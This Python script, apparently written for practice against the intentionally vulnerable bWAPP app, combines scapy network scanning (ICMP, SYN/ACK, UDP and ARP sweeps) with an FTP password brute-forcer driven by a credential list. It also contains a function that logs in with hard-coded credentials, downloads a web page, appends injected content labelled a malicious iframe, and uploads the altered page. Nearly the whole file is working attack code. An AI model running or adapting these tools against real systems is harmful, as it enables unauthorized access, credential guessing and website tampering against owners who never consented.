import ftplib
from scapy.all import *


def ping(ping_target="127.0.0.1", time_out=5):
    answer = sr1(IP(dst=ping_target)/ICMP()/b"XXXXXXXXXXX", timeout=time_out)
    # answer.show()
    return answer


# Return a Dictionary of <IP Address, Open Port>
def host_scan(host, min_port=1024, max_port=65535, time_out=2):
    # Use TCP with SYN flag to look
    ans, unans = sr(IP(dst=host)/TCP(dport=range(min_port, max_port), flags="S"), timeout=time_out)
    ans_list = list(ans)
    for a in ans_list:
        print(a)

    # Use TCP with ACK flag to look
    ans, unans = sr(IP(dst=host)/TCP(dport=range(min_port, max_port), flags="A"), timeout=time_out)
    ans_list = list(ans)
    for a in ans_list:
        print(a)


# UDP Ping
# If all else fails there is always UDP Ping which will produce ICMP Port unreachable errors
# from live hosts. Here you can pick any port which is most likely to be closed,
# such as port 0:
def udp_ping(host, min_port=0, max_port=65535, time_out=2):
    ans, unans = sr(IP(dst=host) / UDP(dport=range(min_port, max_port)), timeout=time_out)
    ans_list = list(ans)
    for a in ans_list:
        print(a)


# ARP-Ping
def arp_ping(network, time_out=2):
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), timeout=time_out)
    ans_list = list(ans)
    for a in ans_list:
        print(a)


def brute_login(hostname, passwd_file="10M.txt"):
    with open(passwd_file) as fd:
        for line in fd:
            user_name = line.split()[0]
            password = line.split()[1].strip('\r').strip('\n')

            try:
                ftp = ftplib.FTP(hostname)
                ftp.login(user_name, password)

                print("\n[*]" + str(hostname) + " FTP Login successful: " + user_name + "/" + password)
                print("Current Working Directory on FTP Server: " + ftp.pwd())
                print("Here are the current directories/files...")
                return_files(ftp)

                # inject_page(ftp, "index.html", redirect_target)
                ftp.quit()
                return user_name, password

            except ftplib.error_perm:
                print("Failed Login attempt...Retrying...")
                pass

            except ftplib.all_errors as e:
                print(e)
                return None, None

            except Exception as e:
                print(e)
                return None, None

    print("[-] Could not brute force FTP credentials")
    return None, None


def return_files(ftp):
    dir_list = None
    try:
        dir_list = ftp.nlst()
        for fileName in dir_list:
            fn = fileName.lower()
            print(fn)
            # if ".php" in fn or ".htm" in fn or ".asp" in fn:
            #    print("[+] Found default page: " + fn)
    except Exception as e:
        print("[-] Could not list directory contents.")
        print(e)
        return dir_list
    return dir_list


def inject_page(ftp, page="robots.txt", redirect="Hello World!\n"):
    ftp = ftplib.FTP(ftp)
    ftp.login("bee", "bug")
    ftp.cwd("/var/www/bWAPP")
    return_files(ftp)

    with open(page + ".tmp", 'w') as fd:
        ftp.retrlines("RETR " + page, fd.write)
        print("[+] Downloaded Page: " + page)
        fd.write(redirect)
    print("[+] Injected Malicious IFrame on: " + page)
    ftp.storlines('STOR ' + page, open(page + '.tmp', 'rb'))
    print("[+] Uploaded Injected page: " + page)
